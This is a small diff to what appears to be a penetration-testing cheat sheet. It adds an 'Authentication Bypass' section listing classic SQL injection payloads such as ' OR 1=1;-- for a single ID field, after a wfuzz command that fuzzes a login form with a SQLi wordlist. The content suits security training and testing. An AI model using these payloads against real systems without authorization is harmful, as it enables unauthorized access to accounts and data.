@@ -147,3 +147,23 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "myusername=
 ```
 
 * Anything you get now should be attempted manually once more in the browser
+
+## Authentication Bypass (one entry field)
+
+Example:&#x20;
+
+Please enter your ID:
+
+```
+123
+
+1'
+
+1'or 1=1-- -
+
+' OR 1=1;--
+
+' OR 1=1;--
+```
+
+* Be sure to Google your errors to attempt to identify the backend database
